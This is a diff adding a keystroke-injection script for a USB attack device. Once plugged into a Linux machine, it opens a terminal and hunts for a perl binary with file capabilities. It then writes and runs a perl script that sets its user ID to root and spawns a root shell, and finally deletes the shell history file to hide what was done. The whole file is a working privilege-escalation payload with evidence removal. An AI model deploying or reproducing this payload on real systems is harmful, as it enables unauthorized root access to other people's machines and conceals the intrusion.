@@ -1,0 +1,25 @@
+CONTROL ALT T
+DELAY 1000
+STRING cd /media/$USER/CIRCUITPY/
+ENTER
+STRING temp=$(getcap -r / 2>/dev/null | grep perl | awk '{print $1}' | tail -1); export util=$temp; echo -e " \n \n \t \t \t \t\e[96;1;4m->>$util<<-\n\e[1;4;0m"
+ENTER
+DELAY 2000
+STRING if [ "$util" == "/usr/bin/perl" ]; then echo -e "\n \n \t \t \t\e[96;1;4m->>Vulnerabilidad encontrada<<-\n\e[1;4;0m"; else echo -e "\n \n \t \t \t\e[96;1;4m->>Vulnerabilidad de Capabilty no encontrada<<-\n\e[1;4;0m" ; getcap -r / 1>capabiltyT.txt 2>/dev/null; fi
+ENTER
+DELAY 2000
+STRING echo -ne '#!/usr/bin/perl \nuse POSIX qw(setuid); \nPOSIX::setuid(0); \nexec "/bin/bash";' > script.pl
+ENTER
+DELAY 500
+STRING chmod +x script.pl
+ENTER
+DELAY 500
+STRING ./script.pl
+ENTER
+DELAY 500
+STRING whoami
+ENTER
+DELAY 500
+STRING rm ~/.bash_history
+ENTER
+DELAY 500
